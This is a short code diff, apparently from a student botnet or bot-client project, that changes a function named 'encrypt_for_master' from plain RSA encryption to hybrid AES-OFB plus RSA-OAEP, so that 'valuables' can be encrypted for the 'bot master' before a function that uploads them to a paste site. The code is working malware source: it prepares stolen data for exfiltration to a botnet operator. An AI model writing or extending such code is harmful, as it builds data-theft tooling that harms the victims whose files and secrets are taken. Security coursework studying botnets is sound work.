@@ -3,6 +3,9 @@ from Crypto.Hash import SHA256
 from Crypto.Signature import PKCS1_v1_5
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+from Crypto import Random
+from Crypto.Cipher import AES
+from lib.helpers import ANSI_X923_pad, ANSI_X923_unpad
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -17,13 +20,21 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
   # Encrypt the file so it can only be read by the bot master
-  # TODO: This current method will break when data that is larger than
-  #       the 'pubKey' size occurs.
-  key = RSA.importKey(open('pubKey.der', 'rb').read())
-  cipher = PKCS1_OAEP.new(key)
-  ciphertext = cipher.encrypt(data)
+  # Generate a random iv and Key to create AES cipher
+  iv  = Random.get_random_bytes(AES.block_size)
+  key = Random.get_random_bytes(AES.block_size)
+  cipher = AES.new(key, AES.MODE_OFB, iv)
+
+  # Encrypt the data using the derived key
+  data_to_encrypt = ANSI_X923_pad(data, cipher.block_size)
+  ciphertext      = cipher.encrypt(data_to_encrypt)
   
-  return ciphertext
+  # Use the rsa key to encrypt the symmetric key
+  rsa_key       = RSA.importKey(open('pubKey.der', 'rb').read())
+  rsa_cipher    = PKCS1_OAEP.new(rsa_key)
+  encrypted_key = rsa_cipher.encrypt(key)
+  
+  return iv + encrypted_key + ciphertext
 
 def upload_valuables_to_pastebot(fn):
   # Encrypt the valuables so only the bot master can read them
